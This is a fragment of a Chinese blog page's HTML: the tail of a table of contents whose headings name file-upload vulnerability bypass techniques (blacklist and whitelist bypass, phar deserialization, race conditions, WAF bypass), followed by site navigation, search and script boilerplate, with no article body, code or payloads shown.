class="toc-number">2.3.1.</span> <span class="toc-text">1.文件内容替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E6%A3%80%E6%B5%8B"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.文件加载检测</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0GIF"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">上传GIF</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0PNG"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">上传PNG</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0JPG"><span class="toc-number">2.3.2.3.</span> <span class="toc-text">上传JPG</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%90%8E%E7%BC%80%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.4.</span> <span class="toc-text">4.后缀校验</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.1.</span> <span class="toc-text">1.黑名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#htaccess%EF%BC%88%E7%99%BD%E5%90%8D%E5%8D%95%E4%B9%9F%E5%8F%AF%EF%BC%89"><span class="toc-number">2.4.1.1.</span> <span class="toc-text">.htaccess（白名单也可）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8Cfuzz"><span class="toc-number">2.4.1.2.</span> <span class="toc-text">利用工具进行fuzz</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.白名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-00%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">1.00解析漏洞</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-ascii-%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.2.2.</span> <span class="toc-text">2.ascii 特殊字符包含</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-webserver%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.4.2.3.</span> <span class="toc-text">3.webserver解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.4.3.</span> <span class="toc-text">3.文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-phar"><span class="toc-number">2.4.3.1.</span> <span class="toc-text">1.phar</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E6%AD%A3%E5%B8%B8%E4%BD%BF%E7%94%A8"><span class="toc-number">2.4.3.1.1.</span> <span class="toc-text">1.正常使用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.4.3.1.2.</span> <span class="toc-text">2.phar反序列化</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-php%E8%87%AA%E5%8C%85%E5%90%AB%E7%89%B9%E6%80%A7"><span class="toc-number">2.4.3.2.</span> <span class="toc-text">2.php自包含特性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.4.3.3.</span> <span class="toc-text">3.反序列化上传</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-end%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7"><span class="toc-number">2.4.3.4.</span> <span class="toc-text">4.end函数缺陷</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.5.</span> <span class="toc-text">5.服务端目录路径校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">2.6.</span> <span class="toc-text">6.条件竞争</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-cms%E3%80%81%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">3.cms、编辑器漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-CMS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text">1.CMS漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">2.编辑器漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-bypassWAF"><span class="toc-number">4.</span> <span class="toc-text">4.bypassWAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-waf%E6%A0%A1%E9%AA%8C"><span class="toc-number">4.1.</span> <span class="toc-text">1.waf校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-bypasswaf"><span class="toc-number">4.2.</span> <span class="toc-text">2.bypasswaf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%90%8E%E7%BC%80"><span class="toc-number">4.2.1.</span> <span class="toc-text">1.后缀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-HTTP%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-number">4.2.2.</span> <span class="toc-text">2.HTTP数据包</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%B8%B8%E8%A7%81waf%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">1.常见waf绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="toc-number">4.2.2.2.</span> <span class="toc-text">2.常规绕过手法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="toc-number">4.2.3.</span> <span class="toc-text">3.文件内容</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">5.总结</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: #FFFFFF"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">簡</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>